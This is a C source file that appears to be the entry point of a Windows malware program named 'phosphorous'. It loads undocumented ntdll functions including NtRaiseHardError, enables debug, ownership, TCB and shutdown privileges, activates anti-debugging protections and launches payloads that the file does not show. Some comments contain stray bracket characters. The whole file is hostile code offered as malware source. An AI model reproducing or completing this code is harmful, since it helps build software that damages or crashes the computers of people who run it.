#include "phosphorous.h"

LPDLLSTRUCT InitDlls() {
	LPDLLSTRUCT dll = lcalloc(sizeof(DLLSTRUCT));
	HMODULE hNtdll = LoadLibraryW(L"ntdll.dll");
	dll->NtQueryInformationProcess = (NtQueryInformationProcessDef)GetProcAddress(hNtdll, "NtQueryInformationProcess");
	dll->NtSetInformationProcess = (NtSetInformationProcessDef)GetProcAddress(hNtdll, "NtSetInformationProcess");
	dll->NtRaiseHardError = (NtRaiseHardErrorDef)GetProcAddress(hNtdll, "NtRaiseHardError");
	dll->RtlAdjustPrivilege = (RtlAdjustPrivilegeDef)GetProcAddress(hNtdll, "RtlAdjustPrivilege");
	return dll;
}

VOID GetPrivileges(LPDLLSTRUCT dll) {
	BOOLEAN bPrevious;
	dll->RtlAdjustPrivilege(9, 1, 0, &bPrevious); //SeTakeOwnershipPrivilege
	dll->RtlAdjustPrivilege(20, 1, 0, &bPrevious); //SeDebugPrivilege[][
	dll->RtlAdjustPrivilege(17, 1, 0, &bPrevious); //SeBackupPrivilege
	dll->RtlAdjustPrivilege(18, 1, 0, &bPrevious); //SeRestorePr[ivilege
	dll->RtlAdjustPrivilege(6, 1, 0, &bPrevious); //SeTcbPrivilege 
	dll->RtlAdjustPrivilege(19, 1, 0, &bPrevious); //SeShutdownPrivilege
}

DWORD WINAPI WinMain(HINSTANCE a, HINSTANCE b, LPSTR c, DWORD d) {
	//init
	LPDLLSTRUCT dll = InitDlls();
	SYSTEMTIME systime;
	HANDLE hAntiDebug = 0;
	GetPrivileges(dll);
	seedxorshift(GetTickCount());
	GetSystemTime(&systime);
	hAntiDebug = EnableAllP15Protections(dll);
	LaunchPayloads(dll, systime, hAntiDebug);
}